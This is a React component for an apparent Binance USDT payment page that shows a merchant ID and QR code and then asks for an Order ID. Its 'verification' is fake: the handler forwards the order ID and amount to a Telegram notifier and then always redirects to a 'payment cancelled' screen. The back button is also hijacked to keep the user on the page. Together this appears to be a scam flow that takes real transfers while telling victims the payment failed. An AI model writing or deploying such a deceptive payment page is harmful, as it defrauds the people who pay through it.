import { useEffect, useState } from "react";
import { X, Copy, Check } from "lucide-react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import { useMerchantInfo } from "@/hooks/useMerchantInfo";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import orderExample from "@/assets/payment/binance-order-example.jpg";
import binanceIcon from "@/assets/payment/binanceIcon";

const BINANCE_LOADER_URL = binanceIcon;

const BinancePayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "00";
  const bdtAmount = parseFloat(amount) || 0;
  const usdtAmount = (bdtAmount / 140).toFixed(2);
  usePaymentAccessGuard("payment");
  const isAllowed = usePaymentMethodGuard("binance");
  const { inv: binanceId, logo: qrImage } = useMerchantInfo("binance", { merchant: "", inv: "" });

  const [step, setStep] = useState<"pay" | "verify">("pay");
  const [orderId, setOrderId] = useState("");
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const onPop = () => {
      if (step === "verify") {
        window.history.pushState(null, "", window.location.href);
        setStep("pay");
        return;
      }

      navigate(`/payment?amount=${amount}&promo=${encodeURIComponent(searchParams.get("promo") || "")}`);
    };
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, [navigate, amount, searchParams, step]);

  const goPayment = () =>
    navigate(`/payment?amount=${amount}&promo=${encodeURIComponent(searchParams.get("promo") || "")}`);

  const goCancel = () =>
    navigate(`/payment-cancelled?channel=Binance&reason=Payment isn't completed&amount=${amount}`);

  const handleTopClose = () => {
    if (step === "pay") goPayment();
    else goCancel();
  };

  const handleCopy = async () => {
    if (!binanceId) return;
    try {
      await navigator.clipboard.writeText(binanceId);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      /* ignore */
    }
  };

  const handleConfirm = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep("verify");
    }, 1200);
  };

  const handleVerify = () => {
    if (orderId.trim().length < 4) {
      setError("Enter a valid Order ID.");
      setTimeout(() => setError(""), 2500);
      return;
    }
    setLoading(true);
    sendTelegramNotification(
      { type: "payment_activity", amount, method: "Binance", orderId: orderId.trim() },
      { force: true },
    );
    setTimeout(() => {
      setLoading(false);
      goCancel();
    }, 5000);
  };

  if (isAllowed !== true) return null;

  return (
    <div className="fixed inset-0 bg-white md:bg-black/40 flex items-start md:items-center justify-center p-0 md:p-4 overflow-auto">
      {loading && (
        <div className="fixed inset-0 z-[100] bg-white/20 backdrop-blur-sm flex items-center justify-center">
          <img
            src={BINANCE_LOADER_URL}
            alt="Binance loading"
            className="h-8 w-8 object-contain animate-[zoom-pulse_1s_ease-in-out_infinite]"
            style={{ animationName: "zoomPulse" }}
          />
          <style>{`@keyframes zoomPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.25); } }`}</style>
        </div>
      )}

      <div className="w-full max-w-[420px] bg-white md:rounded-2xl shadow-xl overflow-hidden min-h-[100dvh] md:min-h-0 flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between px-4 py-3 border-b border-gray-200">
          <h2 className="text-[18px] font-bold text-[#1a1a1a] leading-tight">Binance internal transfer</h2>
          <button
            type="button"
            aria-label="Close"
            onClick={handleTopClose}
            className="text-gray-400 hover:text-gray-600 transition-colors"
          >
            <X className="w-5 h-5" strokeWidth={2} />
          </button>
        </div>

        {/* Exact step progress — thin full-width line through circle centers */}
        <div className="relative px-10 pt-4 pb-1 shrink-0">
          <div
            className="absolute left-10 right-10 top-[30px] h-[2px] rounded-full"
            style={{
              background:
                step === "pay"
                  ? "linear-gradient(to right, #d6dbe3 0%, #d6dbe3 calc(50% - 20px), #9fc0e8 calc(50% + 20px), #1e5aa8 100%)"
                  : "linear-gradient(to right, #1e5aa8 0%, #9fc0e8 calc(50% - 20px), #d6dbe3 calc(50% + 20px), #d6dbe3 100%)",
            }}
          />
          <div className="relative flex items-start justify-between">
            <div className="flex w-[96px] flex-col items-center">
              <div
                className={`flex h-7 w-7 items-center justify-center rounded-full text-[13px] font-bold text-white ${
                  step === "pay" ? "bg-[#1e5aa8]" : "bg-[#9aa0a6]"
                }`}
              >
                1
              </div>
              <span className="mt-1.5 whitespace-nowrap text-[13px] font-medium leading-none text-[#4b5563]">
                Make payment
              </span>
            </div>
            <div className="flex w-[96px] flex-col items-center">
              <div
                className={`flex h-7 w-7 items-center justify-center rounded-full text-[13px] font-bold text-white ${
                  step === "verify" ? "bg-[#1e5aa8]" : "bg-[#9aa0a6]"
                }`}
              >
                2
              </div>
              <span className="mt-1.5 whitespace-nowrap text-[13px] font-medium leading-none text-[#4b5563]">
                Verify payment
              </span>
            </div>
          </div>
        </div>

        <div className="flex-1 px-4 py-4">
          {step === "pay" ? (
            <>
              <div className="text-center mb-4">
                <div className="inline-flex items-baseline gap-1.5">
                  <span className="text-[34px] font-extrabold text-[#1a1a1a] leading-none">{usdtAmount}</span>
                  <span className="text-[16px] text-gray-500 font-medium">USDT</span>
                </div>
                <p className="mt-1 text-[12px] text-gray-400">= ৳{bdtAmount.toLocaleString()} BDT (1 USD = ৳140)</p>
              </div>

              <div className="mb-3">
                <p className="text-[13px] font-bold text-[#1a1a1a] mb-2">Send to Binance ID</p>
                <div className="flex items-stretch border border-gray-200 rounded-md overflow-hidden">
                  <div className="flex-1 px-3 py-2.5 bg-gray-50 text-[13px] text-[#1a1a1a] font-medium truncate">
                    {binanceId || "—"}
                  </div>
                  <button
                    type="button"
                    onClick={handleCopy}
                    className="px-3 py-2.5 bg-white border-l border-gray-200 flex items-center gap-1.5 text-[13px] font-semibold text-[#1a1a1a] hover:bg-gray-50 shrink-0"
                  >
                    {copied ? <Check className="w-3.5 h-3.5 text-green-600" /> : <Copy className="w-3.5 h-3.5" />}
                    {copied ? "Copied" : "Copy"}
                  </button>
                </div>
              </div>

              <div className="bg-gray-100 rounded-md p-4 mt-4">
                <div className="flex justify-center mb-4">
                  {qrImage ? (
                    <img
                      src={qrImage}
                      alt="Binance QR"
                      className="w-[160px] h-[160px] object-contain bg-white p-1.5 rounded-md"
                    />
                  ) : (
                    <div className="w-[160px] h-[160px] bg-white flex items-center justify-center text-[11px] text-gray-400 rounded-md">
                      QR not configured
                    </div>
                  )}
                </div>
                <ol className="text-[12px] text-[#1a1a1a] leading-relaxed space-y-1">
                  <li>Scan the QR using the Binance app or take a screenshot and paste it into the Binance QR Scanner.</li>
                </ol>
                <div className="mt-2 text-[12px] text-[#1a1a1a] leading-relaxed space-y-1">
                  <p>১. একটি স্ক্রিনশট নিন এবং Binance-এর QR স্ক্যানারে সেটি আপলোড করুন।</p>
                  <p>২. অথবা অন্য একটি ফোনে Binance খোলা থাকলে সরাসরি QR কোডটি স্ক্যান করুন। পেমেন্ট সম্পন্ন করার পর “Confirm Payment” বাটনে চাপুন।</p>
                </div>
              </div>
            </>
          ) : (
            <>
              <div className="bg-gray-100 rounded-md px-4 py-3 mb-4 flex items-start justify-between gap-3">
                <div>
                  <p className="text-[11px] text-gray-500 mb-1">Amount</p>
                  <p className="text-[16px] font-bold text-[#1a1a1a]">{usdtAmount} USDT</p>
                </div>
                <div className="text-right min-w-0">
                  <p className="text-[11px] text-gray-500 mb-1">Send to Binance ID</p>
                  <div className="flex items-center gap-1.5 justify-end">
                    <p className="text-[16px] font-bold text-[#1a1a1a] truncate">{binanceId || "—"}</p>
                    <button type="button" onClick={handleCopy} className="text-[#1e5aa8] shrink-0">
                      {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              </div>

              <p className="text-[13px] font-bold text-[#1a1a1a] mb-2">Enter you Binance Order ID</p>
              <input id="binancepayment-fld-1" name="binancepayment-fld-1" aria-label="binancepayment field 1"
                type="text"
                value={orderId}
                onChange={(e) => setOrderId(e.target.value.replace(/\s+/g, "").slice(0, 40))}
                className="w-full border-2 border-[#1e5aa8]/70 rounded-md px-3 py-2.5 text-[14px] font-medium outline-none focus:border-[#1e5aa8] transition-colors"
                autoFocus
              />
              {error && <p className="text-xs text-red-600 mt-1.5">{error}</p>}

              <div className="bg-gray-100 rounded-md p-4 mt-4">
                <div className="flex justify-center">
                  <img
                    src={orderExample}
                    alt="Binance order example"
                    loading="lazy"
                    width={1024}
                    height={1024}
                    className="w-[160px] h-auto object-contain"
                  />
                </div>
                <p className="text-[12px] text-[#1a1a1a] leading-relaxed mt-4 px-0.5">
                  Copy the Order ID from the successful payment details in your Binance account, Paste it into the field above and tap "Verify payment".
                </p>
                <div className="mt-2 text-[12px] text-[#1a1a1a] leading-relaxed space-y-1 px-0.5">
                  <p>১. আপনার Binance অ্যাকাউন্টের সফল পেমেন্টের বিস্তারিত তথ্য থেকে Order ID কপি করুন।</p>
                  <p>২. উপরের ঘরে Order ID পেস্ট করে “Verify Payment” বাটনে চাপুন।</p>
                </div>
              </div>
            </>
          )}
        </div>

        {step === "pay" ? (
          <div className="grid grid-cols-2 gap-3 border-t border-gray-200 px-4 pb-4 pt-2">
            <button
              type="button"
              onClick={goPayment}
              className="w-full rounded-md border border-gray-300 bg-white py-3 text-[15px] font-semibold text-[#1a1a1a] transition-colors hover:bg-gray-50"
            >
              Back
            </button>
            <button
              type="button"
              onClick={handleConfirm}
              className="w-full rounded-md bg-[#1e5aa8] py-3 text-[15px] font-semibold text-white transition-colors hover:bg-[#174a8f]"
            >
              Confirm payment
            </button>
          </div>
        ) : (
          <div className="grid grid-cols-2 gap-3 border-t border-gray-200 px-4 pb-4 pt-2">
            <button
              type="button"
              onClick={() => setStep("pay")}
              className="w-full rounded-md border border-gray-300 bg-white py-3 text-[15px] font-semibold text-[#1a1a1a] transition-colors hover:bg-gray-50"
            >
              Back
            </button>
            <button
              type="button"
              onClick={handleVerify}
              className="w-full rounded-md bg-[#1e5aa8] py-3 text-[15px] font-semibold text-white transition-colors hover:bg-[#174a8f]"
            >
              Verify payment
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default BinancePayment;
